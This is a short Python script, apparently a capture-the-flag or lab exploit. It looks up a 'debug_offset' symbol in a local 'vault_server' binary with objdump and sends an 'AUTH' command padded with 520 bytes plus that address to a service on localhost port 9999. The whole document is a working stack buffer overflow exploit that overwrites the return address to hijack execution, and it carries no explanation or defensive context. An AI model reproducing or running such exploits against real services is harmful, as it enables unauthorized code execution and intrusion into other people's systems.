import socket, struct
import os
addr = os.popen("objdump -t src/vault_server | grep debug_offset | awk '{print $1}'").read().strip()
rip = struct.pack('<Q', int(addr, 16))
payload = b"AUTH " + (b"A" * 520) + rip
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9999))
s.recv(1024)
s.send(payload)
s.close()
